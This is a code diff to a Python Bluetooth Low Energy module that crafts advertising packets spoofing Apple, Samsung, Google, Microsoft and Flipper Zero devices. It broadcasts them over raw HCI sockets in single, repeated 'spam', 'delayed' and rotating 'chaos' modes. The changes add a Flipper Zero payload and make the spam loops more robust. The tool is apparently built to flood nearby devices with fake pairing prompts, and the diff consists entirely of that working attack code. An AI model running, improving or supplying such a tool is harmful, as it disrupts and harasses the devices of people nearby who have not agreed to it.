@@ -117,9 +117,7 @@ class BleModule:
         data += name_bytes
 
         data += bytes([
-            0x03, 0x02, 0x81, 0x30,
-            0x02, 0x0A, 0x00,
-            0x05, 0xFF, 0xBA, 0x0F,
+            0x09, 0xFF, 0xBA, 0x0F,
             0x4C, 0x75, 0x67, 0x26,
             0xE1, 0x80,
         ])
@@ -151,6 +149,9 @@ class BleModule:
         return generators[payload_type]()
 
     def advertise(self, payload, interval_ms=100):
+        if len(payload) > 31:
+            raise ValueError("advertising payload exceeds 31 bytes")
+
         sock = socket.socket(
             socket.AF_BLUETOOTH,
             socket.SOCK_RAW,
@@ -181,7 +182,7 @@ class BleModule:
         )
 
         adv_data = bytes([len(payload)]) + payload.ljust(31, b"\x00")
-        #adv_data = payload.ljust(31, b"\x00")
+
         self._hci_cmd(
             sock,
             self.OGF_LE_CTL,
@@ -208,6 +209,7 @@ class BleModule:
         sock.close()
 
     def run(self, device=None, mode="single", hci=0):
+        self.hci_dev = hci
         self._startble(hci_dev=hci)
         debug("ok", "BLE Module Available")
         print("""
@@ -216,68 +218,95 @@ class BleModule:
     Spam                                  Samsung
     Delayed                               Google
     Chaos (all)                           Microsoft
+    Flipper Zero                         Flipper Zero
             """)
-        mode = input("Device Mode: ")
+        mode = input("Device Mode: ").strip().lower()
         if mode == "chaos":
+            sock = None
             while True:
                 try:
-                    payloadtype = [PayloadType.APPLE, PayloadType.SAMSUNG, PayloadType.GOOGLE, PayloadType.MICROSOFT]
+                    payloadtype = [PayloadType.APPLE, PayloadType.SAMSUNG, PayloadType.GOOGLE, PayloadType.MICROSOFT, PayloadType.FLIPPERZERO]
                     for payloads in payloadtype:
                         actual = self.generate_payload(payloads)
                         print(f"\rAdvertising {payloads}   ", end="", flush=True)
                         sock = self.advertise(payload=actual)
                         time.sleep(3)
                         self.stop_advertising(sock)
+                        sock = None
                 except KeyboardInterrupt:
                     break
                 except OSError:
                     debug("error", "Bluetooth Adapter may be down.")
+                    time.sleep(1)
                 except Exception as e:
                     debug("critical", e)
                     sys.exit(1)
+                finally:
+                    if sock:
+                        self.stop_advertising(sock)
+                        sock = None
         else:
             devicetype = None
-            device = input("Device Type: ")
-            if device.lower() == ('apple'):
+            device = input("Device Type: ").strip().lower()
+            if device == 'apple':
                 devicetype = PayloadType.APPLE
-            elif device.lower() == ('microsoft'):
+            elif device == 'microsoft':
                 devicetype = PayloadType.MICROSOFT
-            elif device.lower() == ('android'):
+            elif device in {'android', 'google'}:
                 devicetype = PayloadType.GOOGLE
-            elif device.lower() == ('samsung'):
+            elif device == 'samsung':
                 devicetype = PayloadType.SAMSUNG
-            elif device.lower() == ('flipperzero'):
+            elif device in {'flipperzero', 'flipper zero'}:
                 devicetype = PayloadType.FLIPPERZERO
             else:
                 debug("error", "Invalid Device Type")
+                return
             if mode == "single":
                 payload = self.generate_payload(devicetype)
-                sock = self.advertise(payload)
-                time.sleep(3)
-                self.stop_advertising(sock)
+                sock = None
+                try:
+                    sock = self.advertise(payload)
+                    time.sleep(3)
+                finally:
+                    if sock:
+                        self.stop_advertising(sock)
+                        sock = None
 
             elif mode == "spam":
+                sock = None
                 while True:
                     try:
                         payload = self.generate_payload(devicetype)
                         sock = self.advertise(payload)
                         print(f"\rAdvertising {payload}...              ", end="", flush=True)
                         time.sleep(0.5)
-                        self.stop_advertising(sock)
                     except KeyboardInterrupt:
                         debug("info", "\nKeyboard Interrupt detected, stopping spam...")
                         break
+                    finally:
+                        if sock:
+                            self.stop_advertising(sock)
+                            sock = None
 
             elif mode == "delayed":
+                sock = None
                 while True:
                     try:
                         payload = self.generate_payload(devicetype)
                         sock = self.advertise(payload)
                         time.sleep(4)
                         self.stop_advertising(sock)
+                        sock = None
                         time.sleep(6)
                     except KeyboardInterrupt:
                         break
+                    except OSError:
+                        debug("error", "Bluetooth Adapter may be down.")
+                        time.sleep(1)
+                    finally:
+                        if sock:
+                            self.stop_advertising(sock)
+                            sock = None
             else:
                 debug("error", "Invalid Device Mode")
 
